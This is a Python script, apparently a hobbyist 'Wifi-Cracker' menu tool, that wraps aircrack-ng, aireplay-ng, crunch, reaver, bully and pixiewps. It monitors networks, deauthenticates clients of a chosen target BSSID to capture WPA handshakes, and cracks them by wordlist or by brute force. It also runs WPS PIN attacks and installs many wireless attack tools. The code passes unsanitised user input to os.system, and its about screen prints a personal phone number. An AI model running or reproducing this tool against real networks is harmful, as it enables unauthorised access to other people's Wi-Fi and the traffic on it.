
# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
from subprocess import check_call
print("\nInstalling Needed Tools")
print("\n")
# Check if system is Arch-based or Debian-based
cmd0 = os.system("if command -v pacman > /dev/null; then "
                "sudo pacman -Sy --needed aircrack-ng crunch terminator wordlists reaver pixiewps bully wifite; "
                "else "
                "apt-get install aircrack-ng crunch terminator wordlists reaver pixiewps bully terminator wifite; "
                "fi")
cmd = os.system("sleep 3 && clear")
def intro():
    cmd  = os.system("clear")
    print("""\033[1;32m
---------------------------------------------------------------------------------------
██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                Coded By BlackHatHacker-Ankit remixed by Baloulsaigneur for ArchLinux
---------------------------------------------------------------------------------------                                                                     
(1)Start monitor mode       
(2)Stop monitor mode                        
(3)Scan Networks                            
(4)Getting Handshake(monitor mode needed)   
(5)Install Wireless tools                   
(6)Crack Handshake with rockyou.txt (Handshake needed)
(7)Crack Handshake with wordlist    (Handshake needed)
(8)Crack Handshake without wordlist (Handshake,essid needed)
(9)Create wordlist                                     
(10)WPS Networks attacks (Bssid,monitor mode needed)
(11)Scan for WPS Networks

(0)About Me
(00)Exit
-----------------------------------------------------------------------
""")
    print("\nEnter your choise here : !# ")
    var = int(input(""))
    if var == 1 :
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4 :
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} -w {} | terminator -e 'aireplay-ng -0 {} -a {} {}'".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
        intro()
    elif var == 5 :
        def wire():
            cmd = os.system("clear")
            print("""
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to main menu
90) airgeddon
91) wifite v2

0)install all wireless tools
""")
            w = int(input("Enter The number of the tool : >>> "))
            if w == 1 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy aircrack-ng; else sudo apt-get update && apt-get install aircrack-ng; fi")
            elif w == 90:
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git; else sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git; fi")
            elif w == 91:
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy git && git clone https://github.com/derv82/wifite2.git; else sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git; fi")
            elif w == 2 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy asleap; else sudo apt-get update && apt-get install asleep; fi")
            elif w == 3 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy bluelog; else sudo apt-get update && apt-get install bluelog; fi")
            elif w == 4 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy bluemaho; else sudo apt-get update && apt-get install bluemaho; fi")
            elif w == 5 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy bluepot; else sudo apt-get update && apt-get install bluepot; fi")
            elif w == 6 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy blueranger; else sudo apt-get update && apt-get install blueranger; fi")
            elif w == 7 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy bluesnarfer; else sudo apt-get update && apt-get install bluesnarfer; fi")
            elif w == 8 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy bully; else sudo apt-get update && apt-get install bully; fi")
            elif w == 9 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy cowpatty; else sudo apt-get update && apt-get install cowpatty; fi")
            elif w == 10 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy crackle; else sudo apt-get update && apt-get install crackle; fi")
            elif w == 11 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy eapmd5pass; else sudo apt-get update && apt-get install eapmd5pass; fi")
            elif w == 12 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy fern-wifi-cracker; else sudo apt-get update && apt-get install fern-wifi-cracker; fi")
            elif w == 13 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy ghost-phisher; else sudo apt-get update && apt-get install ghost-phisher; fi")
            elif w == 14 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy giskismet; else sudo apt-get update && apt-get install giskismet; fi")
            elif w == 15 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy gr-scan; else apt-get install git && git clone git://git.kali.org/packages/gr-scan.git; fi")
            elif w == 16 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy kalibrate-rtl; else sudo apt-get update && apt-get install kalibrate-rtl; fi")
            elif w == 17 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy killerbee-ng; else sudo apt-get update && apt-get install killerbee-ng; fi")
            elif w == 18 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy kismet; else sudo apt-get update && apt-get install kismet; fi")
            elif w == 19 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy mdk3; else sudo apt-get update && apt-get install mdk3; fi")
            elif w == 20 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy mfcuk; else sudo apt-get update && apt-get install mfcuk; fi")
            elif w == 21 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy mfoc; else sudo apt-get update && apt-get install mfoc; fi")
            elif w == 22 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy mfterm; else sudo apt-get update && apt-get install mfterm; fi")
            elif w == 23 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy multimon-ng; else sudo apt-get update && apt-get install multimon-ng; fi")
            elif w == 24 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy pixiewps; else sudo apt-get update && apt-get install pixiewps; fi")
            elif w == 25 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy reaver; else sudo apt-get update && apt-get install reaver; fi")
            elif w == 26 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy redfang; else sudo apt-get update && apt-get install redfang; fi")
            elif w == 27 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy rtlsdr-scanner; else sudo apt-get update && apt-get install rtlsdr-scanner; fi")
            elif w == 28 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy spooftooph; else sudo apt-get update && apt-get install spooftooph; fi")
            elif w == 29 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy wifi-honey; else sudo apt-get update && apt-get install wifi-honey; fi")
            elif w == 30 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy wifitap; else sudo apt-get update && apt-get install wifitap; fi")
            elif w == 31 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy wifite; else sudo apt-get update && apt-get install wifite; fi")
            elif w == 32 :
                intro()
            elif w == 0 :
                cmd = os.system("if command -v pacman > /dev/null; then sudo pacman -Sy aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite; else apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite; fi")
            else:
                print("Not Found")
            wire()
        wire()
    elif var == 0 :
        cmd = os.system("clear")
        print("""
Hi.
My Name is 4nk17, A Ethical Hacker,Bug Bounty Hunter,Currently Working as Cyber Security Researcher.
you can find on Instagram

https://www.instagram.com/ankit_kanojiiya/

Contack me +919768367597

Feel Free to Contact,

""")
        quit()
    elif var == 00:
        exit()
    elif var == 6:
        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            exit()
        elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            exit()
    elif var == 7 :
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()
    elif var == 8 :
        print("\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
        essid = str(input(""))
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("\nEnter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("""
---------------------------------------------------------------------------------------
(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
Crack Password Could Take Hours,Days,Weeks,Months to complete
and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
may reach to Hundreds of TeRa Bits so Be patiant
""")
        print("\nEnter your choise here : ?")
        set = str(input(""))
        if set == "1":
            test = str("abcdefghijklmnopqrstuvwxyz")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "2":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "3":
            test = str("0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "4":
            test = str("!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "5":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "6":
            test = str("abcdefghijklmnopqrstuvwxyz0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "7":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "8":
            test = str("!#$%/=?{}[]-*:;0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "9":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "10":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "11":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "12":
            print("Enter you Own Words and numbers")
            test  = str(input(""))
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        else:
            print("\nNot Found")
            intro()
        print("Copy the Password and Close the tool")
        cmd5 = os.system("sleep 3d")
    elif var == 9 :
        print("\nEnter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("\nEnter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("\nEnter the path of the output file?")
        path = str(input(""))
        print("\nEnter what you want the password contain ?")
        password = str(input(""))
        order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
        geny = os.system(order)
        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
        print(a)
    elif var == 10:
        cmd = os.system("clear")
        print("""
1)Reaver
2)Bully
3)wifite (Recommeneded)
4)PixieWps

0) Back to Main Menu
""")
        print("Choose the kind of the attack(External WIFI Adapter Require) ?")
        attack = int(input(""))
        if attack == 1:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
            geny = os.system(order)
            intro()
        elif attack == 2:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            print("\nEnter the channel of the network ?")
            channel = int(input(""))
            order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
            geny = os.system(order)
            intro()
        elif attack == 3:
            cmd = os.system("wifite")
            intro()
        elif attack == 4:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -K").format(interface,bssid)
            geny = os.system(order)
            intro()
        elif attack == 0 :
            intro()
    elif var == 11:
        print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
        interface = str(input(""))
        order = "airodump-ng -M --wps {}".format(interface)
        geny = os.system(order)
        cmd = os.system("sleep 5 ")
        intro()
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()
